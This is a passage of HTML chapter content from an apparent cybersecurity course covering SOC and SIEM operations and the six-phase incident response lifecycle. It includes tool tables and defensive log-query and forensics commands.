                  <li><strong>Fusion Center:</strong> Integrates security with other disciplines (physical, fraud, risk).</li>
                </ul>

                <h4 class="sub-h">SOC Metrics</h4>
                <ul class="content-list">
                  <li><strong>MTTD (Mean Time to Detect):</strong> Average time to detect an incident.</li>
                  <li><strong>MTTR (Mean Time to Respond):</strong> Average time to respond and contain.</li>
                  <li><strong>MTBF (Mean Time Between Failures):</strong> Reliability of security controls.</li>
                  <li><strong>Alert Volume:</strong> Number of alerts per day.</li>
                  <li><strong>False Positive Rate:</strong> Percentage of alerts that are not real threats.</li>
                  <li><strong>Incidents Handled:</strong> Number of incidents resolved.</li>
                  <li><strong>Coverage:</strong> Percentage of assets monitored.</li>
                  <li><strong>SLA Compliance:</strong> Adherence to response times.</li>
                </ul>

                <h4 class="sub-h">SOC Processes</h4>
                <ul class="content-list">
                  <li><strong>Incident Response Playbooks:</strong> Step-by-step procedures for common incidents.</li>
                  <li><strong>Escalation Procedures:</strong> Define when and how to escalate.</li>
                  <li><strong>Communication Plan:</strong> Who to notify and how.</li>
                  <li><strong>Shift Handover:</strong> Ensure continuity between shifts.</li>
                  <li><strong>Training and Exercises:</strong> Regular drills and tabletop exercises.</li>
                  <li><strong>Continuous Improvement:</strong> Post-incident reviews and lessons learned.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. SIEM In Depth</h3>

                <h4 class="sub-h">Core SIEM Capabilities</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Capability</span><span>Description</span></div>
                  <div class="tool-row"><span>Log Collection</span><span>Gather logs from diverse sources</span></div>
                  <div class="tool-row"><span>Normalization</span><span>Convert logs to common format</span></div>
                  <div class="tool-row"><span>Correlation</span><span>Link events across sources</span></div>
                  <div class="tool-row"><span>Alerting</span><span>Generate alerts on rule matches</span></div>
                  <div class="tool-row"><span>Dashboards</span><span>Visualize security posture</span></div>
                  <div class="tool-row"><span>Reporting</span><span>Generate compliance and management reports</span></div>
                  <div class="tool-row"><span>Forensic Analysis</span><span>Search and analyze historical data</span></div>
                  <div class="tool-row"><span>Threat Intelligence Integration</span><span>Enrich events with external data</span></div>
                  <div class="tool-row"><span>UEBA</span><span>Detect anomalous user behavior</span></div>
                  <div class="tool-row"><span>SOAR Integration</span><span>Automate response actions</span></div>
                </div>

                <h4 class="sub-h">SIEM Architecture</h4>
                <ul class="content-list">
                  <li><strong>Collectors/Agents:</strong> Install on endpoints, servers, network devices.</li>
                  <li><strong>Forwarders:</strong> Send logs to central SIEM.</li>
                  <li><strong>Indexers:</strong> Store and index logs for fast search.</li>
                  <li><strong>Search Heads:</strong> Provide query and dashboard interface.</li>
                  <li><strong>Correlation Engine:</strong> Applies rules to detect incidents.</li>
                  <li><strong>Alerting Engine:</strong> Sends alerts via email, SMS, ticketing.</li>
                  <li><strong>Storage:</strong> Hot, warm, cold storage tiers.</li>
                  <li><strong>Integrations:</strong> Ticketing (Jira, ServiceNow), SOAR, threat intel.</li>
                </ul>

                <h4 class="sub-h">SIEM Rules and Correlation</h4>
                <ul class="content-list">
                  <li><strong>Rule Types:</strong> Threshold, aggregation, correlation, anomaly, behavioral.</li>
                  <li><strong>Sigma:</strong> Vendor-agnostic rule format.</li>
                  <li><strong>Use Cases:</strong> Brute force, lateral movement, malware, exfiltration, insider threat.</li>
                  <li><strong>Tuning:</strong> Reduce false positives by adjusting thresholds, adding context.</li>
                  <li><strong>Testing:</strong> Use Atomic Red Team to validate rules.</li>
                </ul>

                <h4 class="sub-h">SIEM Deployment Models</h4>
                <ul class="content-list">
                  <li><strong>On-Premises:</strong> Full control, high cost, maintenance.</li>
                  <li><strong>Cloud-Based:</strong> Scalable, subscription-based, lower maintenance.</li>
                  <li><strong>Hybrid:</strong> Combination of on-prem and cloud.</li>
                  <li><strong>Managed SIEM:</strong> Third-party provider manages the platform.</li>
                </ul>

                <h4 class="sub-h">Popular SIEM Solutions</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Solution</span><span>Type</span><span>Key Features</span></div>
                  <div class="tool-row"><span>Splunk</span><span>Commercial</span><span>Powerful search, dashboards, apps</span></div>
                  <div class="tool-row"><span>IBM QRadar</span><span>Commercial</span><span>Correlation, offense management</span></div>
                  <div class="tool-row"><span>Microsoft Sentinel</span><span>Cloud</span><span>Azure-native, SOAR, UEBA</span></div>
                  <div class="tool-row"><span>Elastic Security</span><span>Open-source/Commercial</span><span>ELK stack, SIEM, endpoint</span></div>
                  <div class="tool-row"><span>Wazuh</span><span>Open-source</span><span>SIEM, HIDS, compliance</span></div>
                  <div class="tool-row"><span>LogRhythm</span><span>Commercial</span><span>SIEM, UEBA, SOAR</span></div>
                  <div class="tool-row"><span>ArcSight</span><span>Commercial</span><span>Enterprise SIEM</span></div>
                  <div class="tool-row"><span>Sumo Logic</span><span>Cloud</span><span>Cloud-native SIEM</span></div>
                  <div class="tool-row"><span>Exabeam</span><span>Commercial</span><span>UEBA, SIEM</span></div>
                  <div class="tool-row"><span>AlienVault USM</span><span>Commercial</span><span>SIEM, threat intel</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Attack Vectors (Evading Monitoring &amp; SIEM)</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Evasion Techniques</span>
                    <ul>
                      <li><strong>Log Tampering:</strong> Deleting or altering logs to hide activity.</li>
                      <li><strong>Living Off the Land:</strong> Using legitimate tools to avoid detection.</li>
                      <li><strong>Fileless Malware:</strong> Running in memory only.</li>
                      <li><strong>Encrypted C2:</strong> Using HTTPS, DNS tunneling.</li>
                      <li><strong>Slow and Low:</strong> Spreading activity over time to avoid thresholds.</li>
                      <li><strong>Domain Fronting:</strong> Using legitimate CDNs to hide C2.</li>
                      <li><strong>Process Injection:</strong> Hiding in legitimate processes.</li>
                      <li><strong>Timestomping:</strong> Modifying file timestamps.</li>
                      <li><strong>Anti-Forensics:</strong> Using tools to wipe traces.</li>
                      <li><strong>Blending In:</strong> Mimicking normal user behavior.</li>
                    </ul>
                  </div>
                  <div class="cia-attack">
                    <span class="cia-label attack">Attacking the SOC</span>
                    <ul>
                      <li><strong>Alert Fatigue:</strong> Flooding SOC with false positives to hide real attacks.</li>
                      <li><strong>Social Engineering:</strong> Targeting SOC analysts with phishing.</li>
                      <li><strong>Insider Threat:</strong> Malicious SOC employee.</li>
                      <li><strong>Tool Compromise:</strong> Exploiting vulnerabilities in SIEM or EDR.</li>
                      <li><strong>Supply Chain:</strong> Compromising log sources or agents.</li>
                      <li><strong>Data Poisoning:</strong> Injecting false data into SIEM.</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Defensive Controls</h3>

                <h4 class="sub-h">Building a SOC</h4>
                <ul class="content-list">
                  <li>Define Scope: What assets, networks, and services to monitor.</li>
                  <li>Select SIEM: Choose based on budget, scale, and needs.</li>
                  <li>Deploy Collectors: Install agents and configure log forwarding.</li>
                  <li>Develop Use Cases: Prioritize based on risk and threat landscape.</li>
                  <li>Write Detection Rules: Use Sigma, YARA, Snort, Suricata.</li>
                  <li>Staff the SOC: Hire and train Tier 1, 2, 3 analysts.</li>
                  <li>Define Processes: Playbooks, escalation, communication.</li>
                  <li>Implement SOAR: Automate repetitive tasks.</li>
                  <li>Measure and Improve: Track MTTD, MTTR, false positives.</li>
                  <li>Continuous Training: Keep skills sharp.</li>
                </ul>

                <h4 class="sub-h">SIEM Best Practices</h4>
                <ul class="content-list">
                  <li>Centralize all critical logs.</li>
                  <li>Normalize log formats.</li>
                  <li>Use threat intelligence enrichment.</li>
                  <li>Tune rules to reduce false positives.</li>
                  <li>Implement UEBA for insider threats.</li>
                  <li>Use dashboards for situational awareness.</li>
                  <li>Retain logs per compliance requirements.</li>
                  <li>Protect log integrity.</li>
                  <li>Integrate with SOAR for automated response.</li>
                  <li>Regularly test detection with Atomic Red Team.</li>
                  <li>Document detection logic and use cases.</li>
                  <li>Conduct regular rule reviews.</li>
                </ul>

                <h4 class="sub-h">Monitoring Best Practices</h4>
                <ul class="content-list">
                  <li>Monitor both ingress and egress traffic.</li>
                  <li>Monitor authentication and authorization events.</li>
                  <li>Monitor privileged account activity.</li>
                  <li>Monitor cloud infrastructure.</li>
                  <li>Monitor for impossible travel and anomalous logins.</li>
                  <li>Monitor for unusual process creation.</li>
                  <li>Monitor for lateral movement.</li>
                  <li>Monitor for data exfiltration.</li>
                  <li>Use baselines to detect anomalies.</li>
                  <li>Alert on high-risk events.</li>
                  <li>Integrate physical and cyber monitoring.</li>
                  <li>Conduct regular threat hunting.</li>
                </ul>

                <h4 class="sub-h">Incident Response Integration</h4>
                <ul class="content-list">
                  <li>SOC is the first responder.</li>
                  <li>Playbooks define response steps.</li>
                  <li>SOAR automates containment (e.g., disable account, isolate endpoint).</li>
                  <li>Communication with stakeholders.</li>
                  <li>Post-incident review updates detections.</li>
                  <li>Lessons learned improve future response.</li>
                </ul>

                <h4 class="sub-h">SOC Metrics and Reporting</h4>
                <ul class="content-list">
                  <li>Track MTTD and MTTR.</li>
                  <li>Report incidents handled, false positives, and coverage.</li>
                  <li>Provide executive summaries.</li>
                  <li>Use metrics to justify budget and improvements.</li>
                  <li>Benchmark against industry standards.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Splunk</span><span>SIEM</span></div>
                  <div class="tool-row"><span>IBM QRadar</span><span>SIEM</span></div>
                  <div class="tool-row"><span>Microsoft Sentinel</span><span>Cloud SIEM</span></div>
                  <div class="tool-row"><span>Elastic Security</span><span>SIEM</span></div>
                  <div class="tool-row"><span>Wazuh</span><span>SIEM and HIDS</span></div>
                  <div class="tool-row"><span>LogRhythm</span><span>SIEM</span></div>
                  <div class="tool-row"><span>ArcSight</span><span>SIEM</span></div>
                  <div class="tool-row"><span>Sumo Logic</span><span>Cloud SIEM</span></div>
                  <div class="tool-row"><span>Exabeam</span><span>UEBA and SIEM</span></div>
                  <div class="tool-row"><span>AlienVault USM</span><span>SIEM</span></div>
                  <div class="tool-row"><span>CrowdStrike Falcon</span><span>EDR</span></div>
                  <div class="tool-row"><span>SentinelOne</span><span>EDR</span></div>
                  <div class="tool-row"><span>Microsoft Defender ATP</span><span>EDR</span></div>
                  <div class="tool-row"><span>Zeek</span><span>Network monitoring</span></div>
                  <div class="tool-row"><span>Suricata</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>Snort</span><span>IDS/IPS</span></div>
                  <div class="tool-row"><span>Sysmon</span><span>Windows monitoring</span></div>
                  <div class="tool-row"><span>osquery</span><span>Endpoint visibility</span></div>
                  <div class="tool-row"><span>Velociraptor</span><span>Endpoint hunting</span></div>
                  <div class="tool-row"><span>TheHive</span><span>Incident response</span></div>
                  <div class="tool-row"><span>Shuffle</span><span>SOAR</span></div>
                  <div class="tool-row"><span>MISP</span><span>Threat intelligence</span></div>
                  <div class="tool-row"><span>AlienVault OTX</span><span>Threat intelligence</span></div>
                  <div class="tool-row"><span>MITRE ATT&CK</span><span>Adversary tactics</span></div>
                  <div class="tool-row"><span>Sigma</span><span>Detection rules</span></div>
                  <div class="tool-row"><span>Atomic Red Team</span><span>Detection testing</span></div>
                  <div class="tool-row"><span>SANS SOC Survey</span><span>SOC resources</span></div>
                  <div class="tool-row"><span>NIST SP 800-61</span><span>Incident response</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>SOC &amp; SIEM Commands</span></div>
                  <pre><code># Splunk query for failed logons
index=security sourcetype=WinEventLog:Security EventCode=4625

# Splunk query for successful logons
index=security sourcetype=WinEventLog:Security EventCode=4624

# PowerShell failed logons
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4625}

# PowerShell successful logons
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624}

# Query process creation
wevtutil qe Security /q:"*[System[(EventID=4688)]]"

# Capture network traffic
tcpdump -i eth0 -w capture.pcap

# Run Zeek
zeek -i eth0

# Run Suricata
suricata -i eth0 -c /etc/suricata/suricata.yaml

# Convert Sigma rule to Splunk query
sigma convert -t splunk rule.yml

# Query processes with osquery
osqueryi "SELECT * FROM processes;"

# Start Velociraptor
velociraptor --config server.config.yaml frontend</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">9. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Monitoring is continuous observation of systems, networks, and users.</li>
                  <li>SOC is the team, facility, and processes for detecting and responding to incidents.</li>
                  <li>SIEM aggregates, correlates, and analyzes logs for security monitoring.</li>
                  <li>SOC tiers: Tier 1 (triage), Tier 2 (response), Tier 3 (hunting).</li>
                  <li>SIEM capabilities: log collection, normalization, correlation, alerting, dashboards, forensics.</li>
                  <li>Attackers evade monitoring via log tampering, living off the land, encrypted C2.</li>
                  <li>Defenses: centralized logging, SIEM tuning, threat intelligence, UEBA, SOAR, regular hunting.</li>
                  <li>Tools: Splunk, QRadar, Sentinel, Elastic, Wazuh, CrowdStrike, Zeek, Suricata, Sysmon, osquery, Velociraptor, TheHive, Shuffle, MISP.</li>
                  <li>Metrics: MTTD, MTTR, false positive rate, coverage.</li>
                  <li>SOC and SIEM are essential for proactive security and incident response.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">10. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.splunk.com/" target="_blank" rel="noopener">Splunk — SIEM</a>
                  <a href="https://wazuh.com/" target="_blank" rel="noopener">Wazuh — Open-source SIEM and HIDS</a>
                  <a href="https://www.elastic.co/security" target="_blank" rel="noopener">Elastic Security — SIEM</a>
                  <a href="https://github.com/SigmaHQ/sigma" target="_blank" rel="noopener">Sigma — Generic detection rules</a>
                  <a href="https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final" target="_blank" rel="noopener">NIST SP 800-61 — Incident response</a>
                </div>
              </section>
            ` },
                    { id: "5.4", title: "Incident Response Lifecycle", pages: "535-550", read: 22,
            build: "Create an incident response playbook for a ransomware attack.",

            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Incident Response (IR)</strong> is the organized approach to addressing and managing the aftermath of a security breach or cyberattack. The goal is to handle the situation in a way that limits damage, reduces recovery time and costs, and prevents future incidents. The Incident Response Lifecycle is a structured, repeatable process that guides organizations through the detection, containment, eradication, recovery, and post-incident analysis of security incidents. It is commonly aligned with frameworks such as NIST SP 800-61 (Computer Security Incident Handling Guide) and SANS Incident Handler’s Handbook.</p>
                <p>The lifecycle typically consists of six phases: <strong>Preparation, Identification, Containment, Eradication, Recovery, and Lessons Learned</strong>.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenario</h3>
                <p>A large retail company experiences a ransomware attack. The sequence of events unfolds as follows:</p>
                <ul class="content-list">
                  <li><strong>Preparation:</strong> The company has an IR plan, a trained IR team, backups, and endpoint detection tools.</li>
                  <li><strong>Identification:</strong> An EDR alert triggers when a workstation begins encrypting files. The SOC analyst confirms the ransomware and escalates to the IR team.</li>
                  <li><strong>Containment:</strong> The IR team isolates the infected workstation from the network, disables compromised accounts, and blocks the attacker’s C2 IP at the firewall.</li>
                  <li><strong>Eradication:</strong> The team removes the ransomware, reimages the infected system, and patches the vulnerability that allowed initial access.</li>
                  <li><strong>Recovery:</strong> Systems are restored from clean backups, and normal operations resume. The team monitors closely for any signs of reinfection.</li>
                  <li><strong>Lessons Learned:</strong> After the incident, the team conducts a post-mortem, updates the IR plan, improves backups, and conducts additional user training.</li>
                </ul>
                <p>Because of a well-practiced IR lifecycle, the company contains the attack within hours, avoids paying the ransom, and strengthens its defenses.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Incident Response Lifecycle In Depth</h3>

                <figure class="content-figure">
                  <img src="./img/incident-response.png" alt="Six-phase Incident Response Lifecycle — Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned" />
                  <figcaption>Figure 5.4 — The six phases of the Incident Response Lifecycle. Each phase feeds into the next, and Lessons Learned improves future response.</figcaption>
                </figure>

                <h4 class="sub-h">Phase 1: Preparation</h4>
                <p><strong>Definition:</strong> Establishing the capabilities, resources, and plans needed to respond to incidents before they occur.</p>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Develop an Incident Response Plan (IRP).</div>
                  <div class="step-item"><span class="step-num">2</span> Define roles and responsibilities (IR team, SOC, management, legal, HR, PR).</div>
                  <div class="step-item"><span class="step-num">3</span> Establish communication channels and escalation paths.</div>
                  <div class="step-item"><span class="step-num">4</span> Deploy security tools: SIEM, EDR, IDS/IPS, forensic tools.</div>
                  <div class="step-item"><span class="step-num">5</span> Ensure logging and monitoring are in place.</div>
                  <div class="step-item"><span class="step-num">6</span> Create and test backups (3-2-1 rule, offline/immutable).</div>
                  <div class="step-item"><span class="step-num">7</span> Conduct regular training and tabletop exercises.</div>
                  <div class="step-item"><span class="step-num">8</span> Develop playbooks for common incident types (phishing, ransomware, DDoS, data breach).</div>
                  <div class="step-item"><span class="step-num">9</span> Establish relationships with law enforcement, legal counsel, and third-party IR firms.</div>
                  <div class="step-item"><span class="step-num">10</span> Ensure compliance with legal and regulatory requirements.</div>
                </div>

                <h4 class="sub-h">Phase 2: Identification</h4>
                <p><strong>Definition:</strong> Detecting and confirming that a security incident has occurred, and determining its scope and impact.</p>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Monitor alerts from SIEM, EDR, IDS/IPS, and user reports.</div>
                  <div class="step-item"><span class="step-num">2</span> Triage alerts to distinguish false positives from real incidents.</div>
                  <div class="step-item"><span class="step-num">3</span> Validate the incident by gathering evidence (logs, network traffic, memory, disk).</div>
                  <div class="step-item"><span class="step-num">4</span> Determine the type of incident (malware, phishing, DDoS, insider threat, etc.).</div>
                  <div class="step-item"><span class="step-num">5</span> Identify affected systems, accounts, and data.</div>
                  <div class="step-item"><span class="step-num">6</span> Assess the severity and potential impact.</div>
                  <div class="step-item"><span class="step-num">7</span> Document all findings in an incident ticket.</div>
                  <div class="step-item"><span class="step-num">8</span> Escalate to the appropriate tier or team.</div>
                </div>

                <h4 class="sub-h">Phase 3: Containment</h4>
                <p><strong>Definition:</strong> Limiting the scope and impact of the incident to prevent further damage and spread.</p>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Short-term containment: Isolate affected systems (network isolation, disable accounts).</div>
                  <div class="step-item"><span class="step-num">2</span> Long-term containment: Apply temporary fixes, patch vulnerabilities, segment networks.</div>
                  <div class="step-item"><span class="step-num">3</span> Preserve evidence: Capture memory, disk images, and logs before changes.</div>
                  <div class="step-item"><span class="step-num">4</span> Block attacker infrastructure: Firewall rules, DNS sinkholing, IP blocking.</div>
                  <div class="step-item"><span class="step-num">5</span> Disable compromised accounts and reset credentials.</div>
                  <div class="step-item"><span class="step-num">6</span> Notify stakeholders (management, legal, HR, PR).</div>
                  <div class="step-item"><span class="step-num">7</span> Document all actions taken.</div>
                </div>

                <h4 class="sub-h">Phase 4: Eradication</h4>
                <p><strong>Definition:</strong> Removing the threat from the environment and eliminating the root cause.</p>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Identify and remove malware, backdoors, and persistence mechanisms.</div>
                  <div class="step-item"><span class="step-num">2</span> Patch vulnerabilities that allowed initial access.</div>
                  <div class="step-item"><span class="step-num">3</span> Reimage infected systems if necessary.</div>
                  <div class="step-item"><span class="step-num">4</span> Reset credentials for all affected accounts.</div>
                  <div class="step-item"><span class="step-num">5</span> Update security controls (firewall rules, IDS signatures, EDR policies).</div>
                  <div class="step-item"><span class="step-num">6</span> Verify that the threat is completely removed.</div>
                  <div class="step-item"><span class="step-num">7</span> Conduct a root cause analysis.</div>
                </div>

                <h4 class="sub-h">Phase 5: Recovery</h4>
                <p><strong>Definition:</strong> Restoring systems and services to normal operation and verifying that they are secure.</p>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Restore systems from clean backups.</div>
                  <div class="step-item"><span class="step-num">2</span> Rebuild systems from trusted images.</div>
                  <div class="step-item"><span class="step-num">3</span> Apply all security patches.</div>
                  <div class="step-item"><span class="step-num">4</span> Reconnect systems to the network gradually.</div>
                  <div class="step-item"><span class="step-num">5</span> Monitor closely for signs of reinfection.</div>
                  <div class="step-item"><span class="step-num">6</span> Validate that all services are functioning correctly.</div>
                  <div class="step-item"><span class="step-num">7</span> Communicate status to stakeholders.</div>
                  <div class="step-item"><span class="step-num">8</span> Document recovery steps and timelines.</div>
                </div>

                <h4 class="sub-h">Phase 6: Lessons Learned</h4>
                <p><strong>Definition:</strong> Reviewing the incident and the response to improve future readiness.</p>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Conduct a post-incident review meeting (within 1–2 weeks).</div>
                  <div class="step-item"><span class="step-num">2</span> Document what happened, what worked, and what didn’t.</div>
                  <div class="step-item"><span class="step-num">3</span> Identify gaps in tools, processes, and training.</div>
                  <div class="step-item"><span class="step-num">4</span> Update the IR plan and playbooks.</div>
                  <div class="step-item"><span class="step-num">5</span> Improve detection rules and monitoring.</div>
                  <div class="step-item"><span class="step-num">6</span> Provide additional training to staff.</div>
                  <div class="step-item"><span class="step-num">7</span> Share lessons learned with the organization (sanitized).</div>
                  <div class="step-item"><span class="step-num">8</span> Update risk assessments and security controls.</div>
                  <div class="step-item"><span class="step-num">9</span> Consider legal and regulatory reporting requirements.</div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Incident Response Teams and Roles</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Role</span><span>Responsibilities</span></div>
                  <div class="tool-row"><span>Incident Response Manager</span><span>Leads the IR team, makes decisions, communicates with management</span></div>
                  <div class="tool-row"><span>SOC Analyst (Tier 1)</span><span>Monitors alerts, triages, escalates</span></div>
                  <div class="tool-row"><span>Incident Responder (Tier 2)</span><span>Investigates, contains, eradicates</span></div>
                  <div class="tool-row"><span>Threat Hunter (Tier 3)</span><span>Proactively hunts for threats, performs advanced analysis</span></div>
                  <div class="tool-row"><span>Forensic Analyst</span><span>Collects and analyzes evidence, maintains chain of custody</span></div>
                  <div class="tool-row"><span>Malware Analyst</span><span>Analyzes malware samples, develops signatures</span></div>
                  <div class="tool-row"><span>Legal Counsel</span><span>Advises on legal and regulatory issues</span></div>
                  <div class="tool-row"><span>HR</span><span>Handles employee-related incidents (insider threats)</span></div>
                  <div class="tool-row"><span>Public Relations</span><span>Manages external communications</span></div>
                  <div class="tool-row"><span>IT Operations</span><span>Assists with recovery and restoration</span></div>
                  <div class="tool-row"><span>Management</span><span>Provides resources, approves actions</span></div>
                </div>

                <h4 class="sub-h">Incident Response Frameworks and Standards</h4>
                <ul class="content-list">
                  <li><strong>NIST SP 800-61 Rev. 2:</strong> Computer Security Incident Handling Guide.</li>
                  <li><strong>SANS Incident Handler's Handbook:</strong> Six-step process.</li>
                  <li><strong>ISO/IEC 27035:</strong> Information security incident management.</li>
                  <li><strong>CREST:</strong> Cyber security incident response guidelines.</li>
                  <li><strong>ENISA:</strong> Good practice guide for incident management.</li>
                  <li><strong>MITRE ATT&CK:</strong> Framework for adversary tactics and techniques.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Attack Vectors (Evading IR)</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">How Attackers Evade IR</span>
                    <ul>
                      <li><strong>Delaying Detection:</strong> Using slow and low techniques, fileless malware, encrypted C2.</li>
                      <li><strong>Evading Containment:</strong> Using multiple C2 channels, fallback mechanisms.</li>
                      <li><strong>Destroying Evidence:</strong> Log tampering, timestomping, wiping disks.</li>
                      <li><strong>Causing Confusion:</strong> Alert floods, false flags, decoy attacks.</li>
                      <li><strong>Re-entering:</strong> Maintaining persistence, creating backdoors.</li>
                      <li><strong>Targeting IR Team:</strong> Phishing IR staff, compromising their tools.</li>
                      <li><strong>Exploiting Legal Gaps:</strong> Operating across jurisdictions, using encrypted channels.</li>
                      <li><strong>Ransomware:</strong> Encrypting backups first, then production.</li>
                      <li><strong>Supply Chain:</strong> Compromising trusted software to gain access.</li>
                    </ul>
                  </div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Defensive Controls</h3>

                <h4 class="sub-h">Best Practices for an Effective IR Lifecycle</h4>
                <ul class="content-list">
                  <li><strong>Preparation:</strong> Develop and regularly test an IR plan. Train the IR team. Deploy robust logging and monitoring. Maintain offline, immutable backups. Establish communication protocols. Conduct tabletop exercises.</li>
                  <li><strong>Identification:</strong> Use multiple detection sources. Tune SIEM rules to reduce false positives. Leverage threat intelligence. Encourage user reporting. Document everything.</li>
                  <li><strong>Containment:</strong> Act quickly but carefully. Preserve evidence. Isolate affected systems. Block attacker infrastructure. Communicate with stakeholders.</li>
                  <li><strong>Eradication:</strong> Remove all malware and persistence. Patch vulnerabilities. Reset credentials. Verify complete removal.</li>
                  <li><strong>Recovery:</strong> Restore from clean backups. Monitor closely. Gradually reconnect systems. Validate functionality.</li>
                  <li><strong>Lessons Learned:</strong> Conduct post-incident reviews. Update plans and playbooks. Improve detection and response. Train staff. Share lessons.</li>
                </ul>

                <h4 class="sub-h">IR Metrics</h4>
                <ul class="content-list">
                  <li><strong>MTTD (Mean Time to Detect):</strong> Average time to detect an incident.</li>
                  <li><strong>MTTR (Mean Time to Respond):</strong> Average time to respond and contain.</li>
                  <li><strong>MTTC (Mean Time to Contain):</strong> Average time to contain the incident.</li>
                  <li><strong>MTTE (Mean Time to Eradicate):</strong> Average time to remove the threat.</li>
                  <li><strong>MTTR (Mean Time to Recover):</strong> Average time to restore normal operations.</li>
                  <li><strong>Number of Incidents Handled:</strong> Total incidents resolved.</li>
                  <li><strong>False Positive Rate:</strong> Percentage of alerts that are not real threats.</li>
                  <li><strong>Cost per Incident:</strong> Financial impact of each incident.</li>
                </ul>

                <h4 class="sub-h">Legal and Regulatory Considerations</h4>
                <ul class="content-list">
                  <li>Report breaches to authorities (e.g., FIA in Pakistan, GDPR in EU).</li>
                  <li>Notify affected parties.</li>
                  <li>Preserve evidence for legal proceedings.</li>
                  <li>Comply with data protection laws.</li>
                  <li>Consider cyber insurance.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Tools &amp; Commands</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Tool</span><span>Purpose</span></div>
                  <div class="tool-row"><span>NIST SP 800-61</span><span>Incident handling guide</span></div>
                  <div class="tool-row"><span>SANS Incident Handler's Handbook</span><span>IR process</span></div>
                  <div class="tool-row"><span>ISO/IEC 27035</span><span>Incident management</span></div>
                  <div class="tool-row"><span>MITRE ATT&CK</span><span>Adversary tactics</span></div>
                  <div class="tool-row"><span>TheHive</span><span>Incident response platform</span></div>
                  <div class="tool-row"><span>Cortex</span><span>Analysis engine for TheHive</span></div>
                  <div class="tool-row"><span>MISP</span><span>Threat intelligence sharing</span></div>
                  <div class="tool-row"><span>Volatility</span><span>Memory forensics</span></div>
                  <div class="tool-row"><span>FTK Imager</span><span>Disk imaging</span></div>
                  <div class="tool-row"><span>Autopsy</span><span>Disk forensics</span></div>
                  <div class="tool-row"><span>Wireshark</span><span>Network analysis</span></div>
                  <div class="tool-row"><span>Zeek</span><span>Network monitoring</span></div>
                  <div class="tool-row"><span>Sysmon</span><span>Windows monitoring</span></div>
                  <div class="tool-row"><span>Velociraptor</span><span>Endpoint hunting</span></div>
                  <div class="tool-row"><span>Shuffle</span><span>SOAR</span></div>
                  <div class="tool-row"><span>CrowdStrike Falcon</span><span>EDR</span></div>
                  <div class="tool-row"><span>SentinelOne</span><span>EDR</span></div>
                  <div class="tool-row"><span>Microsoft Defender ATP</span><span>EDR</span></div>
                  <div class="tool-row"><span>Splunk</span><span>SIEM</span></div>
                  <div class="tool-row"><span>IBM QRadar</span><span>SIEM</span></div>
                  <div class="tool-row"><span>Microsoft Sentinel</span><span>Cloud SIEM</span></div>
                  <div class="tool-row"><span>Wazuh</span><span>SIEM and HIDS</span></div>
                  <div class="tool-row"><span>Atomic Red Team</span><span>Detection testing</span></div>
                  <div class="tool-row"><span>Sigma</span><span>Detection rules</span></div>
                  <div class="tool-row"><span>YARA</span><span>Pattern matching</span></div>
                  <div class="tool-row"><span>VirusTotal</span><span>File and URL scanning</span></div>
                  <div class="tool-row"><span>Any.Run</span><span>Malware sandbox</span></div>
                  <div class="tool-row"><span>Hybrid Analysis</span><span>Malware analysis</span></div>
                  <div class="tool-row"><span>Joe Sandbox</span><span>Malware sandbox</span></div>
                </div>

                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Incident Response &amp; Forensics Commands</span></div>
                  <pre><code># Memory forensics
volatility -f memory.dmp imageinfo
volatility -f memory.dmp --profile=Win7SP1x64 pslist
volatility -f memory.dmp --profile=Win7SP1x64 malfind

# Disk imaging
ftkimager /dev/sda image.dd

# Launch Autopsy
autopsy

# Capture network traffic
tcpdump -i eth0 -w capture.pcap
wireshark capture.pcap

# Run Zeek
zeek -i eth0

# View successful logons
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624}

# View failed logons
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4625}

# Query process creation
wevtutil qe Security /q:"*[System[(EventID=4688)]]"

# Query processes with osquery
osqueryi "SELECT * FROM processes;"

# Start Velociraptor
velociraptor --config server.config.yaml frontend

# Launch TheHive
thehive

# Launch MISP
misp</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Incident Response is a structured approach to managing security breaches.</li>
                  <li>The six phases: Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned.</li>
